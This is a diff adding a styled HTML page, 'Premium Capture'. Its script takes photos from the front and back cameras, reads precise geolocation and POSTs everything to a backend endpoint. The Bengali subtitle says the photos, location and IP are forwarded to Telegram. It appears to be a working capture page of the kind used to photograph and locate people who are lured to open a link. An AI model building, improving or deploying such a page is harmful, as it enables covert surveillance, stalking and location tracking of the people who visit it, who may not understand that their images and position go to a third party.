@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Premium Capture</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0a001a;
+      --card: rgba(20, 20, 40, 0.75);
+      --text: #e0e0ff;
+      --accent: #00eaff;
+      --glow: 0 0 25px rgba(0, 234, 255, 0.7);
+      --border: rgba(0, 234, 255, 0.25);
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(135deg, #0a001f, #1a0033, #0f0f1a);
+      color: var(--text);
+      font-family: 'Roboto', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    h1 {
+      font-family: 'Orbitron', sans-serif;
+      font-size: clamp(2.5rem, 10vw, 4.5rem);
+      background: linear-gradient(90deg, #00eaff, #a78bfa, #ff71ce);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: var(--glow);
+      letter-spacing: 3px;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+
+    .subtitle {
+      font-size: clamp(1rem, 5vw, 1.4rem);
+      max-width: 90%;
+      text-align: center;
+      margin-bottom: 3rem;
+      color: #b0b0ff;
+      line-height: 1.6;
+    }
+
+    .premium-card {
+      background: var(--card);
+      backdrop-filter: blur(16px);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      padding: clamp(2rem, 6vw, 4rem) clamp(1.5rem, 5vw, 4rem);
+      box-shadow: 0 20px 60px rgba(0,0,0,0.7), var(--glow);
+      width: 100%;
+      max-width: 700px;
+      text-align: center;
+    }
+
+    button {
+      padding: clamp(16px, 5vw, 20px) clamp(40px, 10vw, 70px);
+      font-size: clamp(1.1rem, 5vw, 1.5rem);
+      font-weight: 700;
+      cursor: pointer;
+      border: none;
+      border-radius: 60px;
+      color: white;
+      background: linear-gradient(135deg, #00eaff, #7c3aed, #ff71ce);
+      box-shadow: 0 10px 30px rgba(0, 234, 255, 0.5);
+      transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      position: relative;
+      overflow: hidden;
+      width: 100%;
+      max-width: 400px;
+      margin: 0 auto;
+      display: block;
+    }
+
+    button:hover {
+      transform: translateY(-8px) scale(1.05);
+      box-shadow: 0 25px 60px rgba(0, 234, 255, 0.8);
+    }
+
+    button:disabled {
+      opacity: 0.4;
+      transform: none;
+      box-shadow: none;
+      cursor: not-allowed;
+    }
+
+    #status {
+      margin-top: 3rem;
+      font-size: clamp(1rem, 4vw, 1.4rem);
+      color: #a0a0ff;
+      text-shadow: 0 0 12px rgba(160,160,255,0.6);
+      min-height: 50px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Dual Camera + Location Capture</h1>
+  <p class="subtitle">এক ক্লিকে ফ্রন্ট + ব্যাক ছবি + লোকেশন + IP Telegram-এ চলে যাবে</p>
+
+  <div class="premium-card">
+    <button id="captureBtn" onclick="captureAll()">
+      Capture & Send Everything
+    </button>
+
+    <div id="status"></div>
+  </div>
+
+  <script>
+    const btn = document.getElementById('captureBtn');
+    const status = document.getElementById('status');
+
+    async function captureAll() {
+      btn.disabled = true;
+      btn.textContent = "Processing...";
+      status.textContent = "Starting...";
+
+      try {
+        // ১. Front camera photo
+        status.textContent = "Front camera...";
+        const frontStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }
+        });
+        const frontBase64 = await quickCapture(frontStream);
+        await sendData({ type: "front", image: frontBase64 });
+
+        // ২. Back camera photo
+        status.textContent = "Back camera...";
+        const backStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "environment" }
+        });
+        const backBase64 = await quickCapture(backStream);
+        await sendData({ type: "back", image: backBase64 });
+
+        // ৩. Geolocation
+        status.textContent = "Getting location...";
+        let geo = "Permission denied";
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 8000,
+              maximumAge: 0
+            });
+          });
+          geo = `${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)} (accuracy: ${position.coords.accuracy}m)`;
+        } catch (geoErr) {
+          geo = geoErr.message || "Location error";
+        }
+
+        // সব ডাটা একসাথে পাঠানো
+        await sendData({
+          type: "info",
+          geo: geo,
+          timestamp: new Date().toISOString()
+        });
+
+        status.textContent = "All sent successfully ✓ (photos + location)";
+      } catch (err) {
+        status.textContent = "Error: " + (err.message || "Unknown");
+        console.error(err);
+      } finally {
+        btn.disabled = false;
+        btn.textContent = "Capture & Send Everything";
+      }
+    }
+
+    async function quickCapture(stream) {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await new Promise(r => video.onloadedmetadata = r);
+      await video.play();
+
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      stream.getTracks().forEach(t => t.stop());
+      return canvas.toDataURL('image/png');
+    }
+
+    async function sendData(payload) {
+      const res = await fetch("/api/send-all", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      if (!res.ok) throw new Error("Send failed");
+    }
+  </script>
+</body>
+</html>
